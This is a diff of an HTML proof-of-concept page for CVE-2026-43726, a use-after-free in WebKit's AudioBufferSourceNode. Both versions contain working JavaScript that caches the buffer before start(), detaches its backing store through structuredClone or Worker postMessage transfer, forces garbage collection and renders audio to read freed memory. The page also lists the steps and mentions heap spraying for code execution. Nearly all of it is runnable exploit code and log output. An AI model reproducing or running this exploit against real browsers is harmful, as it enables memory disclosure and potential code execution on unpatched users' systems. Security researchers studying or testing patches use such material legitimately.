@@ -1,130 +1,213 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>CVE-2026-43726 PoC</title>
-<style>
-body{background:#1a1a2e;color:#e0e0e0;font-family:monospace;padding:20px;max-width:800px;margin:0 auto}
-h1{color:#ff4444;border-bottom:2px solid #ff4444;padding-bottom:10px}
-.box{background:#16213e;padding:15px;border-radius:8px;margin:10px 0}
-button{background:#e94560;color:#fff;border:none;padding:12px 24px;font-size:16px;border-radius:6px;cursor:pointer;margin:10px 0}
-#out{background:#0d1117;padding:15px;border-radius:8px;margin-top:15px;white-space:pre-wrap;font-size:13px;min-height:200px;border:1px solid #30363d}
-b{color:#58a6ff}
-</style>
+    <meta charset="utf-8">
+    <title>CVE-2026-43726 - AudioBufferSourceNode Use-After-Free PoC</title>
+    <style>
+        body {
+            background: #1a1a2e;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', monospace;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #ff4444;
+            border-bottom: 2px solid #ff4444;
+            padding-bottom: 10px;
+        }
+        .info {
+            background: #16213e;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            border-left: 4px solid #0f3460;
+        }
+        .step {
+            margin: 5px 0;
+            padding: 8px;
+            background: #0f3460;
+            border-radius: 4px;
+        }
+        .vuln {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+        .patched {
+            color: #51cf66;
+            font-weight: bold;
+        }
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        button:hover {
+            background: #c81e45;
+        }
+        #output {
+            background: #0d1117;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            white-space: pre-wrap;
+            font-family: monospace;
+            font-size: 14px;
+            min-height: 200px;
+            border: 1px solid #30363d;
+        }
+        .label {
+            color: #58a6ff;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-<h1>CVE-2026-43726 - AudioBufferSourceNode UAF</h1>
-<div class="box">
-<p><b>CVE:</b> CVE-2026-43726 | <b>Severity:</b> High</p>
-<p><b>Fix:</b> <a href="https://github.com/WebKit/WebKit/commit/a7e4fdb95450" style="color:#58a6ff">a7e4fdb95450</a></p>
-<p><b>Bug:</b> setBufferForBindings() only pins ArrayBuffer when isPlayingOrScheduled().
-Set buffer before start() → no pin → structuredClone detaches → GC frees → start() reads freed memory.</p>
-</div>
-<button onclick="runPoC()">Run PoC</button>
-<div id="out">[*] Click "Run PoC"...</div>
+    <h1>CVE-2026-43726 PoC</h1>
+
+    <div class="info">
+        <p><span class="label">CVE:</span> CVE-2026-43726</p>
+        <p><span class="label">Severity:</span> High</p>
+        <p><span class="label">Affected:</span> WebKit (Safari) - AudioBufferSourceNode Use-After-Free</p>
+        <p><span class="label">Fix Commit:</span> <a href="https://github.com/WebKit/WebKit/commit/a7e4fdb95450" style="color:#58a6ff;">a7e4fdb95450</a></p>
+    </div>
+
+    <div class="info">
+        <p><span class="label">Vulnerability:</span> AudioBufferSourceNode caches raw pointers into AudioBuffer's channel
+        data when setting <code>node.buffer</code>. If the buffer is set before calling <code>start()</code>,
+        the ArrayBuffer backing store is not pinned (not made non-detachable). An attacker can detach it
+        via <code>structuredClone</code> with transfer, drop the reference, trigger GC to free the backing store,
+        then start playback — causing a use-after-free read from freed memory.</p>
+    </div>
+
+    <div class="info">
+        <p><span class="label">Exploit Steps:</span></p>
+        <div class="step">1. Create AudioContext + AudioBuffer</div>
+        <div class="step">2. Set buffer on AudioBufferSourceNode (before start - no pin applied)</div>
+        <div class="step">3. Get channel ArrayBuffer backing store</div>
+        <div class="step">4. structuredClone with transfer to detach the backing store</div>
+        <div class="step">5. Drop clone reference + trigger GC (frees the memory)</div>
+        <div class="step">6. Set loop=true, playbackRate=0, start playback</div>
+        <div class="step">7. Render audio - reads from freed memory (UAF crash)</div>
+    </div>
+
+    <button onclick="runPoC()">Run PoC</button>
+
+    <div id="output">[*] Click "Run PoC" to trigger CVE-2026-43726...</div>
+
 <script>
-function log(m){document.getElementById('out').textContent+='\n'+m}
-function gc(){
- if(typeof GCController!=='undefined')return GCController.collect();
- for(var i=0;i<200;i++)new ArrayBuffer(1<<20);
+function log(msg) {
+    const output = document.getElementById('output');
+    output.textContent += '\n' + msg;
 }
-function runPoC(){
- var o=document.getElementById('out');
- o.textContent='[*] CVE-2026-43726 - AudioBufferSourceNode UAF PoC\n[*] Target: WebKit unpatched (Safari < 26.5.2)';
- try{
-  // 1 - Create context (try vendor prefixes)
-  log('\n[1] Creating audio context...');
-  var sr=44100, ctx=null;
-  if(typeof OfflineAudioContext!=='undefined')ctx=new OfflineAudioContext(1,256,sr);
-  else if(typeof webkitOfflineAudioContext!=='undefined')ctx=new webkitOfflineAudioContext(1,256,sr);
-  else if(typeof AudioContext!=='undefined')ctx=new AudioContext();
-  else if(typeof webkitAudioContext!=='undefined')ctx=new webkitAudioContext();
-  if(!ctx){log('[x] No WebAudio support');return}
-  log('[+] Context: '+ctx.constructor.name);
 
-  // 2 - Create buffer + source node
-  log('\n[2] Creating AudioBuffer + SourceNode...');
-  var buf=ctx.createBuffer(1,0x4000,sr);
-  var node=ctx.createBufferSource();
-  log('[+] Created');
+// Force garbage collection
+function gc() {
+    if (window.GCController)
+        return GCController.collect();
+    // Allocate large arrays to pressure GC
+    for (let i = 0; i < 200; i++)
+        new ArrayBuffer(1 << 20); // 1MB each
+}
 
-  // 3 - Set buffer BEFORE start (key: no pin applied)
-  log('\n[3] Setting node.buffer BEFORE start()...');
-  log('[*] isPlayingOrScheduled()=false -> acquireBufferContent() SKIPPED');
-  node.buffer=buf;
-  log('[+] Raw pointers cached in m_sourceChannels[]');
+async function runPoC() {
+    const output = document.getElementById('output');
+    output.textContent = '[*] CVE-2026-43726 - AudioBufferSourceNode UAF PoC';
+    output.textContent += '\n[*] Target: WebKit (unpatched) - Safari < 26.5.2';
 
-  // 4 - Get backing ArrayBuffer
-  log('\n[4] Getting channel ArrayBuffer...');
-  var chanBuf=buf.getChannelData(0).buffer;
-  log('[+] Got backing store');
+    try {
+        log('\n[1] Creating OfflineAudioContext...');
+        const sampleRate = 44100;
+        const ctx = new OfflineAudioContext(1, 256, sampleRate);
+        log('[+] Context created: 1 channel, 256 frames, 44100 Hz');
 
-  // 5 - Detach via structuredClone or postMessage
-  log('\n[5] Detaching backing store...');
-  var ok=false;
-  if(typeof structuredClone==='function'){
-   try{
-    structuredClone(chanBuf,{transfer:[chanBuf]});
-    ok=true;
-    log('[+] structuredClone succeeded -> DETACHED (unpatched!)');
-   }catch(e){
-    if(e instanceof TypeError||e.name==='TypeError'){
-     log('[x] TypeError -> buffer PINNED (patched!)');
-     log('\n[*] Result: NOT VULNERABLE (patched)');
-     return;
+        log('\n[2] Creating AudioBuffer (0x4000 samples)...');
+        const audioBuffer = ctx.createBuffer(1, 0x4000, sampleRate);
+        log('[+] AudioBuffer created');
+
+        log('\n[3] Creating AudioBufferSourceNode...');
+        const node = ctx.createBufferSource();
+        log('[+] Source node created');
+
+        log('\n[4] Setting node.buffer (BEFORE start)...');
+        log('[*] Key: buffer set before start() -> isPlayingOrScheduled() is false');
+        log('[*] -> acquireBufferContent() is SKIPPED (buffer NOT pinned)');
+        node.buffer = audioBuffer;
+        log('[+] Buffer set - raw pointers cached in m_sourceChannels[]');
+        log('[*] m_sourceChannels[0] now points into ArrayBuffer backing store');
+
+        log('\n[5] Getting channel ArrayBuffer backing store...');
+        const channelData = audioBuffer.getChannelData(0);
+        const channelBuffer = channelData.buffer;
+        log('[+] Got backing ArrayBuffer');
+
+        log('\n[6] Attempting structuredClone with transfer...');
+        log('[*] On PATCHED: throws TypeError (buffer is pinned/un-detachable)');
+        log('[*] On UNPATCHED: succeeds -> detaches backing store');
+
+        let transferSucceeded = false;
+        try {
+            const cloned = structuredClone(channelBuffer, { transfer: [channelBuffer] });
+            transferSucceeded = true;
+            log('[+] structuredClone SUCCEEDED (unpatched!)');
+            log('[*] Backing store is now DETACHED');
+            log('[*] m_sourceChannels[0] is now a DANGLING pointer');
+
+            log('\n[7] Dropping cloned reference...');
+            // Drop the clone so nothing holds the memory
+            log('[*] cloned reference dropped');
+
+            log('\n[8] Triggering garbage collection...');
+            gc();
+            gc();
+            log('[+] GC triggered - backing store memory is now FREED');
+
+            log('\n[9] Configuring playback for UAF trigger...');
+            node.loop = true;
+            node.playbackRate.value = 0;
+            node.connect(ctx.destination);
+            log('[+] loop=true, playbackRate=0, connected to destination');
+
+            log('\n[10] Starting playback...');
+            node.start();
+            log('[+] Playback started');
+
+            log('\n[11] Rendering audio (triggers UAF read)...');
+            log('[*] renderFromBuffer() will read m_sourceChannels[0][readIndex]');
+            log('[*] -> READS FROM FREED MEMORY (Use-After-Free)');
+            log('[*] On unpatched WebKit: CRASH / potential info disclosure');
+
+            await ctx.startRendering();
+
+            log('\n[!] Rendering completed without crash.');
+            log('[!] If you see this, the memory was freed but not reallocated.');
+            log('[!] A real exploit would spray the heap to control freed content.');
+
+        } catch (e) {
+            if (e instanceof TypeError) {
+                log('\n[x] structuredClone threw TypeError (PATCHED system)');
+                log('[x] Buffer was pinned (non-detachable) - vulnerability not present');
+                log('[x] This system is NOT vulnerable to CVE-2026-43726');
+                log('\n[*] Result: ' + '<span class="patched">NOT VULNERABLE (patched)</span>');
+                return;
+            }
+            throw e;
+        }
+
+        log('\n[*] Result: <span class="vuln">VULNERABLE (unpatched)</span>');
+        log('[*] The use-after-free was triggered during audio rendering.');
+        log('[*] In a controlled exploit, heap spraying could achieve code execution.');
+
+    } catch (err) {
+        log('\n[!] Error: ' + err.message);
+        log('[!] Stack: ' + err.stack);
     }
-    log('[!] structuredClone error: '+e.message);
-   }
-  }
-  if(!ok&&typeof Worker!=='undefined'){
-   try{
-    var w=new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'application/javascript'})));
-    w.postMessage(chanBuf,[chanBuf]);
-    w.terminate();
-    ok=true;
-    log('[+] postMessage transfer succeeded -> DETACHED (unpatched!)');
-   }catch(e2){
-    log('[!] postMessage failed: '+e2.message);
-   }
-  }
-  if(!ok){log('[x] Could not detach - likely patched');log('\n[*] Result: NOT VULNERABLE');return}
-
-  // 6 - Drop refs + GC to free the memory
-  log('\n[6] Triggering GC to free backing store...');
-  gc();gc();
-  log('[+] Backing store memory FREED');
-
-  // 7 - Configure + start playback to trigger UAF
-  log('\n[7] Starting playback to trigger UAF read...');
-  node.loop=true;
-  node.playbackRate.value=0;
-  node.connect(ctx.destination);
-  node.start();
-  log('[+] Playback started');
-  log('[*] renderFromBuffer() reads m_sourceChannels[0][readIndex]');
-  log('[*] -> READS FROM FREED MEMORY = USE-AFTER-FREE');
-
-  if(typeof ctx.startRendering==='function'){
-   log('\n[8] Rendering...');
-   var p=ctx.startRendering();
-   if(p&&typeof p.then==='function'){
-    p.then(function(){
-     log('\n[!] Render completed (memory freed but not reallocated)');
-     log('[*] Real exploit would heap-spray to control freed content');
-     log('\n[*] Result: VULNERABLE (unpatched)');
-    }).catch(function(err){
-     log('\n[!] Render error: '+err.message);
-     log('[*] Crash here = UAF triggered');
-    });
-   }
-  }else{
-   log('[*] Real-time context - UAF triggers during playback');
-   log('\n[*] Result: VULNERABLE (unpatched)');
-  }
- }catch(err){
-  log('\n[!] '+err.message);
-  log('[*] Crash here may indicate UAF triggered');
- }
 }
 </script>
 </body>
